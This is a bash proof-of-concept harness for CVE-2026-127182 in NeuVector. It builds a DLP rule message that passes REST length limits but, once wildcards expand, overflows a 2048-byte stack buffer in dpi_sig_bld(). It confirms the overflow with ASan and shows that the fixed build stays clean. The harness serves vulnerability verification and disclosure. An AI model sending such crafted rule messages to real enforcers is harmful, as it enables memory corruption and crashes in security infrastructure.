#!/usr/bin/env bash
# Wire-path reproduction for CVE-2026-127182 (one-command replay).
#
# Generates the controller->dataplane DLP message using VERBATIM excerpts of
# the pinned controller wildcard expander and the pinned real dp/ctrl.c JSON
# consumer, then feeds that real JSON through libjansson into the byte-identical
# real dpi_sig_bld() object built by realcaller/run.sh. Asserts ASan on the
# REST-validated shape and clean fixed/safe controls. No full enforcer binary.
set -u
cd "$(dirname "$0")"
pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -Fq -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -Fq -- "$2" "$1" 2>/dev/null; }

ROOT=$(readlink -f ../src/real/neuvector-48ae8b5cac5ec3a7e332e5272e9b3050f44396cb)
[ -f "$ROOT/dp/dpi/sig/dpi_sig.c" ] || { echo "FAIL pinned tree missing: run realcaller/run.sh first"; echo "TOTAL: 0 PASS / 1 FAIL"; exit 1; }
[ -f ../realcaller/out/real-vuln-asan.o ] || { echo "FAIL real ASan object missing: run realcaller/run.sh first"; echo "TOTAL: 0 PASS / 1 FAIL"; exit 1; }
[ -f ../realcaller/out/real-fixed-asan.o ] || { echo "FAIL fixed ASan object missing: run realcaller/run.sh first"; echo "TOTAL: 0 PASS / 1 FAIL"; exit 1; }

DLP_GO="$ROOT/controller/rest/dlp_rule.go"
SYSTEM_GO="$ROOT/agent/system.go"
APIS_GO="$ROOT/controller/api/apis.go"
CTRL_C="$ROOT/dp/ctrl.c"
OUT=$(pwd)/out
mkdir -p "$OUT" gen

echo "== provenance of verbatim excerpts =="
for f in "$DLP_GO" "$SYSTEM_GO" "$APIS_GO" "$CTRL_C"; do sha256sum "$f"; done
# Expansion function (verbatim lines 300-346) and real dp JSON consumer
# (verbatim lines 2098-2208) are sliced at run time, never hand-copied.
sed -n '300,346p' "$DLP_GO" > gen/wildCardToRegexp.inc
sed -n '2098,2208p' "$CTRL_C" > gen/dp_ctrl_bld_dlp.inc
sha256sum gen/wildCardToRegexp.inc gen/dp_ctrl_bld_dlp.inc
has gen/wildCardToRegexp.inc 'func wildCardToRegexp(pattern string) string' && ok "verbatim wildcard expander excerpt" || bad "verbatim wildcard expander excerpt"
has gen/dp_ctrl_bld_dlp.inc 'static int dp_ctrl_bld_dlp(json_t *msg)' && ok "verbatim dp JSON consumer excerpt" || bad "verbatim dp JSON consumer excerpt"
has gen/dp_ctrl_bld_dlp.inc 'dpi_sig_bld(&dlpbld, flag);' && ok "dp consumer calls pinned vulnerable function" || bad "dp consumer calls pinned vulnerable function"
has "$SYSTEM_GO" 'pat = fmt.Sprintf("%s/%s/is", pat, pc.Value)' && ok "wire prefix /<value>/is present in pinned agent" || bad "wire prefix /<value>/is present in pinned agent"
has "$SYSTEM_GO" 'pat = fmt.Sprintf("%s; context %s", pat, pc.Context)' && ok "wire context suffix present in pinned agent" || bad "wire context suffix present in pinned agent"

echo "== generate controller-shaped JSON =="
cat > gen/main.go <<'GOEOF'
package main

import (
    "encoding/json"
    "fmt"
    "regexp"
    "os"
    "strings"
)

GOEOF
cat gen/wildCardToRegexp.inc >> gen/main.go
cat >> gen/main.go <<'GOEOF'

type entry struct {
    Name     string   `json:"name"`
    ID       uint32   `json:"id"`
    Patterns []string `json:"patterns"`
}
type build struct {
    Flag        uint     `json:"flag"`
    ApplyDir    int      `json:"dir"`
    DlpRules    []*entry `json:"dlp_rules"`
    WorkloadMac []string `json:"mac"`
    DelMac      []string `json:"delmac"`
}
type req struct {
    DPDlpBld *build `json:"ctrl_bld_dlp"`
}

func main() {
    // api.DlpRuleNameMaxLen=256, PatternMaxNum=16, PatternTotalMaxLen=1024,
    // PatternMaxLen=512 (controller/api/apis.go:140-144).
    attack := len(os.Args) > 2 && os.Args[2] == "attack"
    name, num := "r", 1
    ch := "a"
    if len(os.Args) > 3 { ch = os.Args[3] }
    value := strings.Repeat(ch+"*", 4) // 8 bytes, passes every limit
    if attack {
        name = strings.Repeat("N", 256)
        num = 16
        value = strings.Repeat(ch+"*", 32) // 64 bytes; 16*64 = 1024 total limit
    }
    preTotal, expandedTotal, wireTotal := 0, 0, 0
    rule := &entry{Name: name, ID: 1001, Patterns: []string{}}
    for i := 0; i < num; i++ {
        preTotal += len(value)
        expanded := wildCardToRegexp(value)
        expandedTotal += len(expanded)
        // agent/system.go:1020,1024: "/<value>/is" then "; context <context>".
        wire := fmt.Sprintf("%s/%s/is", "", expanded)
        wire = fmt.Sprintf("%s; context %s", wire, "body") // share.DlpPatternContextDefault
        wireTotal += len(wire)
        rule.Patterns = append(rule.Patterns, wire)
    }
    fmt.Printf("WIREGEN mode=%s name_len=%d num=%d pre_total=%d expanded_total=%d wire_total=%d\n",
        os.Args[2], len(name), num, preTotal, expandedTotal, wireTotal)
    data := req{DPDlpBld: &build{Flag: 3, ApplyDir: 0, DlpRules: []*entry{rule},
        WorkloadMac: []string{}, DelMac: []string{}}}
    b, err := json.Marshal(data)
    if err != nil { panic(err) }
    if err := os.WriteFile(os.Args[1], b, 0644); err != nil { panic(err) }
}
GOEOF
GO111MODULE=off go build -o gen/wiregen gen/main.go && ok "wire generator builds" || { bad "wire generator builds"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
gen/wiregen "$OUT/wire-attack.json" attack > "$OUT/wiregen-attack.log" 2>&1 || true
gen/wiregen "$OUT/wire-safe.json" safe > "$OUT/wiregen-safe.log" 2>&1 || true
gen/wiregen "$OUT/wire-B.json" attack B > "$OUT/wiregen-B.log" 2>&1 || true
cat "$OUT/wiregen-attack.log" "$OUT/wiregen-safe.log" "$OUT/wiregen-B.log"
has "$OUT/wiregen-attack.log" 'pre_total=1024' && ok "attack input respects 1024-byte total limit" || bad "attack input respects 1024-byte total limit"
has "$OUT/wiregen-attack.log" 'name_len=256' && ok "attack name respects 256-byte REST limit" || bad "attack name respects 256-byte REST limit"
has "$OUT/wiregen-B.log" 'pre_total=1024' && ok "chosen-byte B variant respects 1024-byte total limit" || bad "chosen-byte B variant respects 1024-byte total limit"
[ "$(stat -c %s "$OUT/wire-attack.json")" -gt 2048 ] && ok "encoded controller message itself exceeds 2048 bytes" || bad "encoded controller message itself exceeds 2048 bytes"

echo "== build C consumer with real jansson + real pinned dpi_sig object =="
cat > gen/wirecall.c <<'CEOF'
/* Calls the verbatim pinned dp_ctrl_bld_dlp() JSON consumer with libjansson
 * against the byte-identical pinned dpi_sig_bld() object. Only logging,
 * ether_aton_r and strlcpy are supplied locally; jansson is the real library. */
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <jansson.h>

#include "dpi/sig/dpi_sig.h"
#include "dpi/sig/dpi_search.h"

uint32_t g_debug_levels = 0;
rcu_map_t g_ep_map;
void debug_log(bool print_ts, const char *fmt, ...) { (void)print_ts; (void)fmt; }
bool debug_log_packet_filter(const dpi_packet_t *p) { (void)p; return false; }
int dp_dlp_wait_ctrl_req_thr(int req) { (void)req; return 0; }
void dpi_dlp_init_hs_search(void *detector) { (void)detector; }
void *rcu_map_lookup(rcu_map_t *m, const void *key) { (void)m; (void)key; return NULL; }
struct ether_addr;
static dpi_sigopt_api_t api_name, api_sig_id, api_ctx, api_pcre;
static dpi_sigopt_status_t noop_parser(char *value, dpi_sig_t *sig)
{ (void)value; (void)sig; return DPI_SIGOPT_OK; }
dpi_sigopt_api_t *dpi_sigopt_sig_id_register(void) { api_sig_id.parser = noop_parser; return &api_sig_id; }
dpi_sigopt_api_t *dpi_sigopt_name_register(void) { api_name.parser = noop_parser; return &api_name; }
dpi_sigopt_api_t *dpi_sigopt_context_register(void) { api_ctx.parser = noop_parser; return &api_ctx; }
dpi_sigopt_api_t *dpi_sigopt_pcre_register(void) { api_pcre.parser = noop_parser; return &api_pcre; }
char *strip_str(char *s)
{ if (!s) return s; size_t n = strlen(s); while (n && (s[n-1] == ' ' || s[n-1] == '\t' || s[n-1] == '\r' || s[n-1] == '\n')) s[--n] = 0; return s; }
char *strip_str_quote(char *s)
{ if (!s) return s; size_t n = strlen(s); if (n >= 2 && ((s[0] == '"' && s[n-1] == '"') || (s[0] == '\'' && s[n-1] == '\''))) { s[n-1] = 0; memmove(s, s+1, n-1); } return s; }
char **str_split(const char *s, const char *delim, int *count)
{
    char *copy = strdup(s);
    int cap = 16, n = 0;
    char **out = calloc(cap, sizeof(*out));
    for (char *tok = strtok(copy, delim); tok; tok = strtok(NULL, delim)) {
        if (n == cap) { cap *= 2; char **tmp = realloc(out, cap * sizeof(*out)); if (!tmp) break; out = tmp; }
        out[n++] = strdup(tok);
    }
    free(copy); *count = n; return out;
}
void free_split(char **tokens, int count)
{ if (!tokens) return; for (int i = 0; i < count; i++) free(tokens[i]); free(tokens); }
struct ether_addr *ether_aton_r(const char *s, struct ether_addr *a) { (void)s; return a; }
size_t strlcpy(char *dst, const char *src, size_t n)
{
    size_t len = strlen(src);
    if (n) { size_t c = len < n-1 ? len : n-1; memcpy(dst, src, c); dst[c] = 0; }
    return len;
}
#define DEBUG_CTRL(...) do { } while (0);
#define DEBUG_ERROR(...) do { } while (0);

#include "dp_ctrl_bld_dlp.inc"

int main(int argc, char **argv)
{
    if (argc < 2) return 2;
    json_error_t err;
    json_t *root = json_load_file(argv[1], 0, &err);
    if (!root) { printf("WIRECALL json_load_file failed: %s\n", err.text); return 3; }
    json_t *msg = json_object_get(root, "ctrl_bld_dlp");
    dpi_dlp_init();
    if (!msg) { printf("WIRECALL no ctrl_bld_dlp key\n"); return 4; }
    int rc = dp_ctrl_bld_dlp(msg);
    printf("WIRECALL rc=%d\n", rc);
    json_decref(root);
    return rc;
}
CEOF
ROOT_INC="-I$(dirname "$ROOT")/shim -I$ROOT -I$ROOT/dp -include stdio.h -include $ROOT/base.h -include $ROOT/defs.h"
SAN="-g -O0 -fsanitize=address -fno-omit-frame-pointer -fno-stack-protector"
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
gcc $SAN -Igen -Ijansson $ROOT_INC -c gen/wirecall.c -o "$OUT/wirecall.o" && ok "verbatim dp consumer compiles with real jansson" || { bad "verbatim dp consumer compiles with real jansson"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
LIB=/usr/lib/x86_64-linux-gnu/libjansson.so.4
gcc $SAN -o "$OUT/wire-vuln" "$OUT/wirecall.o" ../realcaller/out/real-vuln-asan.o "$LIB" && ok "link wire-vuln" || bad "link wire-vuln"
gcc $SAN -o "$OUT/wire-fixed" "$OUT/wirecall.o" ../realcaller/out/real-fixed-asan.o "$LIB" && ok "link wire-fixed" || bad "link wire-fixed"

echo "== runs =="
"$OUT/wire-vuln" "$OUT/wire-attack.json" > "$OUT/attack.log" 2>&1 || true
"$OUT/wire-vuln" "$OUT/wire-safe.json"  > "$OUT/safe.log" 2>&1 || true
"$OUT/wire-fixed" "$OUT/wire-attack.json" > "$OUT/fixed.log" 2>&1 || true
cat "$OUT/attack.log" | grep -E 'WIRECALL|AddressSanitizer|WRITE of size|dpi_sig_bld|dlpsig_buf' | head -12
cat "$OUT/safe.log" | head -4
cat "$OUT/fixed.log" | head -4
has "$OUT/attack.log" 'AddressSanitizer: stack-buffer-overflow' && ok "REST-validated wire message overflows real dpi_sig_bld" || bad "REST-validated wire message overflows real dpi_sig_bld"
has "$OUT/attack.log" 'dpi_sig_bld dp/dpi/sig/dpi_sig.c:658' && ok "overflow write frame is pinned sprintf" || bad "overflow write frame is pinned sprintf"
has "$OUT/attack.log" "'dlpsig_buf' (line 621)" && ok "overflow names real 2048-byte buffer" || bad "overflow names real 2048-byte buffer"
hasnt "$OUT/safe.log" 'AddressSanitizer' && ok "safe wire input ASan-clean" || bad "safe wire input ASan-clean"
has "$OUT/safe.log" 'WIRECALL rc=0' && ok "safe wire input rc=0" || bad "safe wire input rc=0"
hasnt "$OUT/fixed.log" 'AddressSanitizer' && ok "fixed source ASan-clean on attack wire input" || bad "fixed source ASan-clean on attack wire input"
has "$OUT/fixed.log" 'WIRECALL rc=0' && ok "fixed source rc=0 on attack wire input" || bad "fixed source rc=0 on attack wire input"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
